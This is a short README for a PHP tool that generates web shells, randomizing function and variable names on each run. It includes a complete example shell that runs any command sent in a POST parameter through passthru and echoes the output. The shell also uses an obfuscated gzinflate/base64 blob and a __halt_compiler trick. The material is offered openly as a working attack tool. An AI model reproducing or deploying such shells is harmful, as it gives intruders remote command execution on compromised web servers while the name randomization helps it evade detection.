2233.php
========

## Overview

2233.php is a webshell generator, it generates the function and variable names for a web shell on each run, and spits them to stdout.

## Usage

    $ php -f 2233.php

...and then a new web shell pops out.
    
## Example Shell
    <?php
    $SnHCQlIQNe2 = gzinflate(base64_decode("dVFhS8MwEP3urzgjioqyrm7rXLuBoN8GTtwnv6VtasuaXG2vujn87ybpxuLAEB53715fj5coJ1nOTkCfKBc87UrbNrQpxaE3p1BVS1uIebJ6r7FV6W2CJdYTqN/jS384vIE9XIXwVaSUT6Dveefhzx+ba9hChopum+JbaIVfrUNwnLwbMFd7WFXGZVFuJiBRYVPxRMBpISusiSs6co4x3fy/n2dW6+Dq6EPtq7buDv1AC/fgqqOeE0zUO4QWmZ87+WVYS+AJFaimLP54G3y2j7gYMyjSKTNDBlJQjrpbPL8u2d+oI5s10KYSU0ZiTQwUl7rm89XjKh8t5y8+A94SJiirUpAeYZZ1VIZJ2xz5xS0Rqp1h08ayIDa7OFsHT6FG3zM4GhkcDg0GfYN3FgeuZmz5gVX2D3wwcKaWDx6sxsGO2fn4trZ6/95Ox47bUxj1upWdSHsmtl3aCab6EaKqFrNf"));
    
    function S0CPIBHLSac($O1gids31RI){
        echo "<span>$ ".$O1gids31RI."</span><br>";
        echo htmlentities(passthru($O1gids31RI." 2>&1"));
    }
    echo preg_replace("/bqZ4vuDoP8/", basename($_SERVER["SCRIPT_NAME"]), $SnHCQlIQNe2);
    
    if (isset($_POST["aLkDkh6TLQ2"])){
        S0CPIBHLSac($_POST["aLkDkh6TLQ2"]);
    }
    else {
        S0CPIBHLSac("#");
    }
    __halt_compiler/*
    */();

They're all pretty much the same format, just randomized variable/function names.

## Licence

MIT.
